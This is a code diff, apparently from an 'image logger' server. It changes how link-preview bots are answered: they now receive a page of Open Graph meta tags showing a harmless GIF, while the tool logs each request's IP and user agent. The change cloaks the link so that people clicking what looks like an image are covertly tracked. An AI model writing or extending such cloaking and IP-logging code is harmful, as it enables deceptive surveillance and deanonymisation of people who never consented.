@@ -298,14 +298,28 @@ body {{
                 return
             
             if botCheck(ip, user_agent):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else config["loadingImage"])
-                self.end_headers()
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
-
-                makeReport(ip, useragent=user_agent, endpoint=s.split("?")[0], url=url)
-                return
+                            gif_url = config.get("loadingImage", "https://static2.klipy.com/ii/d7aec6f6f171607374b2065c836f92f4/81/5b/ohlqDdgJ.gif")
+                            bot_html = f'''<!DOCTYPE html>
+            <html>
+            <head>
+                <meta property="og:title" content=" ">
+                <meta property="og:type" content="website">
+                <meta property="og:image" content="{gif_url}">
+                <meta property="og:image:type" content="image/gif">
+                <meta name="twitter:card" content="summary_large_image">
+                <meta name="twitter:image" content="{gif_url}">
+                <meta name="theme-color" content="#2b2d31">
+            </head>
+            <body></body>
+            </html>'''.encode()
+            
+                            self.send_response(200)
+                            self.send_header('Content-type', 'text/html; charset=utf-8')
+                            self.end_headers()
+                            self.wfile.write(bot_html)
+            
+                            makeReport(ip, useragent=user_agent, endpoint=s.split("?")[0], url=url)
+                            return
             
             else:
                 s = self.path
